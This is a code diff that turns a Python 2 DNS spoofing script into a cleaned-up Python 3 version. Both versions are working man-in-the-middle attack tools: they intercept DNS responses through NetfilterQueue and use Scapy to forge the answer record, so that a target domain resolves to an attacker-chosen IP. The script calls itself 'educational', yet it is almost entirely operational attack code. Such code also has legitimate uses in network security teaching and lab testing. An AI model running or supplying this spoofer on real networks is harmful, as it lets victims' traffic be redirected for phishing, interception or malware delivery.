@@ -1,40 +1,94 @@
-#!/usr/bin/env python
-#running on python2
-#use ping -c 1 www.bing.com to get the result
-import netfilterqueue
-import scapy.all as scapy
-#
-def process_packet(packet):
-    scapy_packet=scapy.IP(packet.get_payload())
-    #converts packet into a readable scapy packet
-    # scapy.DNSRR gets DNS response
-    if scapy_packet.haslayer(scapy.DNSRR):
-        qname= scapy_packet[scapy.DNSQR].qname
-        #gets the qname field and stores it (query name)
-        if "www.bing.com" in qname:
-            print("[+]Spoofing target")
-            ans=scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
-            #change the DNS Response information
-            #rrname- sets the response name as the query
-            #rdata- sets the data to our own ip
-            scapy_packet[scapy.DNS].an=ans
-            #sets the packest DNS answer field to our custom answer
-            scapy_packet[scapy.DNS].ancount=1
-            #sets answer count to 1
+#!/usr/bin/env python3
+"""
+DNS Spoofer – Man-in-the-Middle DNS Poisoning (Educational & Lab Use Only)
 
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].chksum
-            del scapy_packet[scapy.UDP].len
-            #deletes the chksum and len fields from the IP field and UDP field
-            #len and chksum are there to make sure that we arent changing the DNS
-            #they are fail safe commands for the DNS Server
-            packet.set_payload(str(scapy_packet))
-            #sets the payload of the returned packet to the string of our custom scapy packet
+This script:
+- Binds to NetfilterQueue queue 0
+- Intercepts DNS response packets
+- If the queried domain matches TARGET_DOMAIN, it rewrites the answer (A record)
+  to point to FAKE_IP.
+"""
+
+import netfilterqueue
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
+
+# ===================== Configuration =====================
+
+# Domain to spoof (must include trailing dot because DNSQ.qname does)
+TARGET_DOMAIN = b"www.example.com."
+# IP address to which the victim will be redirected
+FAKE_IP = "192.168.1.100"
+
+# =========================================================
+
+
+def process_packet(packet):
+    """
+    Callback for each packet received from NFQUEUE.
+    """
+    scapy_packet = IP(packet.get_payload())
+
+    # Check if this packet has a DNS response layer
+    if scapy_packet.haslayer(DNSRR) and scapy_packet.haslayer(DNSQR):
+        qname = scapy_packet[DNSQR].qname
+
+        # Check if the query name contains our target domain
+        if TARGET_DOMAIN in qname:
+            try:
+                decoded_qname = qname.decode(errors="ignore")
+            except Exception:
+                decoded_qname = str(qname)
+
+            print(f"[+] Intercepted DNS response for: {decoded_qname}")
+            print(f"[+] Spoofing {decoded_qname} -> {FAKE_IP}")
+
+            # Create a forged DNS answer
+            answer = DNSRR(rrname=qname, rdata=FAKE_IP)
+
+            # Replace the original answer with our forged one
+            scapy_packet[DNS].an = answer
+            scapy_packet[DNS].ancount = 1
+
+            # Remove length and checksum fields so Scapy recalculates them
+            if scapy_packet.haslayer(IP):
+                del scapy_packet[IP].len
+                del scapy_packet[IP].chksum
+
+            if scapy_packet.haslayer(UDP):
+                del scapy_packet[UDP].len
+                del scapy_packet[UDP].chksum
+
+            # Set the modified packet payload
+            packet.set_payload(bytes(scapy_packet))
+
+    # Accept the (possibly modified) packet
     packet.accept()
-queue=netfilterqueue.NetfilterQueue()
-#creates an instance of the netfilter onject
-queue.bind(0, process_packet )
-#connected the queue to the queue we previously created
-queue.run()
-#runs the queue that we created
+
+
+def main():
+    """
+    Main entry point: bind to NFQUEUE and start processing packets.
+    """
+    print("[*] DNS Spoofer starting...")
+    try:
+        print(f"[*] Target domain : {TARGET_DOMAIN.decode(errors='ignore')}")
+    except Exception:
+        print(f"[*] Target domain : {TARGET_DOMAIN}")
+    print(f"[*] Fake IP        : {FAKE_IP}")
+    print("[*] Binding to NFQUEUE number 0. Press Ctrl+C to stop.\n")
+
+    queue = netfilterqueue.NetfilterQueue()
+
+    try:
+        # Bind to queue number 0 (must match your iptables rule)
+        queue.bind(0, process_packet)
+        queue.run()
+    except KeyboardInterrupt:
+        print("\n[!] Ctrl+C detected. Exiting...")
+    finally:
+        queue.unbind()
+        print("[*] NFQUEUE unbound. Bye!")
+
+
+if __name__ == "__main__":
+    main()
